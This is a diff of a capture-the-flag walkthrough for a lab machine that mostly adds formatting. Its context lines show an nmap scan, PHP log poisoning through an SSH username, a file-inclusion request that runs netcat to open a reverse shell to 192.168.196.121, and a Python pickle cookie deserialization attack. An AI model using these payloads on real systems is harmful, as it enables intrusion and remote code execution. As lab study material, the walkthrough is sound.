@@ -4,6 +4,7 @@
 ## 1.1 Discovery host
 `nmap -Pn -F 192.168.196.1/24 -oN host_discovery.txt`
 ![840e1e97c9f94578c757d7fd3c689c58.png](./_resources/349aeda966314e6f8d09bcfcbd4a1774.png)
+
 Or you can use netdiscover.
 
 ## 1.2 Service enum
@@ -25,6 +26,7 @@ Or you can use netdiscover.
 
 ### 1.3.2 Downloading and reading .log files
 ![a1c099d558fcf0a1d61e3f9a286db9df.png](./_resources/923829f107e945e6b7a41707a66f6ac7.png)
+
 Apparently the file reader reads these .log files and exclude the extension.
 
 
@@ -76,6 +78,7 @@ ssh '<?=`$_GET[0]`?>@192.168.196.127'
 GET /sea.php?file=/../var/log/auth&0=nc+192.168.196.121+4446+-e+/bin/bash
 ```
 ![41c70d61d8a0b08a44cbe0cb4cd68fee.png](./_resources/fe456d74e92b491db68c287f7dbedab2.png)
+
 Since we have nc or any other way on target, we can use it for get reverse shell:
 ![e905767d0ac3bad464d5a031d815d98e.png](./_resources/0e91b6820bd04a20900f2006aad65434.png)
 
@@ -109,6 +112,7 @@ We need to liberate the internal port 8080 on the kali for examine it:
 ![871d11e257ef55e125102ff953880218.png](./_resources/4bfaac7691be42f6a08e79d799f01959.png)
 
 ![df9bf8bf57207863f1663384960b0fec.png](./_resources/5a338a152d2b442590792a507f02c051.png)
+
 We have a cookie with base64 encode.
 Let's decode it:
 ![a2faa58b0d558074ef2d46ea76f628d9.png](./_resources/b8651e2ba33843d38c8ecee493831f13.png)
@@ -116,14 +120,16 @@ Let's decode it:
 ### 3.3.2 Python Pickle without exploit to get root
 A quick search in google, reveal that the web application is using Python Pickle:
 ![34c46c4628137be5bc34b7590a2d1e39.png](./_resources/454c47d973674ee5a1c0fd8caca828c6.png)
+
 This articles explain about exploit it:
-https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/ 
-https://www.synopsys.com/blogs/software-security/python-pickling/
-https://blog.nelhage.com/2011/03/exploiting-pickle/
-https://intoli.com/blog/dangerous-pickles/
+* https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/ 
+* https://www.synopsys.com/blogs/software-security/python-pickling/
+* https://blog.nelhage.com/2011/03/exploiting-pickle/
+* https://intoli.com/blog/dangerous-pickles/
 
 You can use use burpsuit instead code an exploit:
 ![ce0615a224028acc4f853e5964d9aec9.png](./_resources/48add1eec8404568aa483028b4b3ffb2.png)
+
 Needs encode to base64:
 
 ![1581ff27f0379884666328b034bca78e.png](./_resources/0fe79ecb71274e4b8eaa09a7e72de099.png)]
